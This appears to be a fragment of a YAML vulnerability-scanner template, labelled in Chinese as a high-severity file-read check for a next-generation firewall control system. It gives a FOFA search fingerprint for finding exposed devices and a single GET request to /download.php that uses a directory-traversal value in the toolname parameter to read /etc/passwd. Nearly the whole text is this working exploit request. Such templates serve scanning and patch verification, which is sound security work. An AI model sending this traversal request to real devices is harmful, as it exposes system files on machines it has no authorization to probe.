  severity: high
  tags:
  - 文件读取
  finger: 下一代防火墙控制系统
  fofa: body="Get_Verify_Info(hex_md5(user_string)."
requests:
- method: GET
  path: /download.php?&class=vpn&toolname=../../../../../../../../etc/passwd
